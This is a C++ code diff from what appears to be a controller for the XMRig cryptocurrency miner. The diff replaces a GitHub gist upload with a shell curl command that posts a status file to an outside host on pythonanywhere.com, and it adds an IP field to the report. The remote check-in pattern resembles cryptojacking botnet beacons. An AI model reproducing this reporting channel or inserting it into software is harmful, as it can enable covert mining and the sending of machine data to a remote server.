@@ -16,6 +16,7 @@
 struct JsonPayload
 {
     std::string name;
+    std::string ip;
     std::string status;
     std::string xmrig_status;
     std::string err;
@@ -75,6 +76,8 @@ private:
 
     std::string is_xmrig_running = "standby";
 
+    std::string m_ip = "128.0.0.1";
+
 private:
     // Variables for sending data to the server
     int m_send_sock;
@@ -132,11 +135,11 @@ static std::string getBroadCastAddress(){
     return exec("INTERFACE=$(ip route show default | awk \'{print $5}\') && ip -4 addr show $INTERFACE | awk \'$1 == \"inet\" {print $4}'");
 }
 
-static int run_gist_upload(const std::string &token, const std::string &filename, std::string &out_response) {
-    std::string cmd = "curl -sS -H \"Authorization: token " + token +
-                      "\" -H \"Accept: application/vnd.github+json\" "
-                      "-H \"Content-Type: application/json\" -X POST "
-                      "https://api.github.com/gists --data-binary @" + filename;
+static int run_gist_upload(const std::string &filename, std::string &out_response) {
+
+    std::string cmd = (std::string)"curl -sS -X POST 'http://EchoBreakStatus.pythonanywhere.com/api/status' \\" +
+          "-H 'Content-Type: application/json' \\" +
+          "--data-binary @"+filename;
 
     std::array<char, 4096> buffer;
     out_response.clear();
